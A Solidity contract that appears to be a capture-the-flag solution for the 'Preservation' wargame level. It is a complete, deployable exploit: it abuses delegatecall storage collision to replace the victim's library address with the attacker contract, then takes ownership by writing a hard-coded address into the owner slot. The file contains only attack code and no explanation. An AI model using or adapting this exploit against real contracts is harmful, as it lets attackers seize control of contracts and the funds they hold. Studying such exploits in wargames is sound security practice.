// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Preservation.sol";

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Preservation public preservation;

    constructor(address _preservationAddress) {
        preservation = Preservation(_preservationAddress);
    }

    function attack() public {
        uint _timeStamp = uint(uint160(address(this)));
        preservation.setFirstTime(_timeStamp);
        preservation.setFirstTime(42);
    }

    function setTime(uint _time) public {
        owner = 0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd;
    }
}
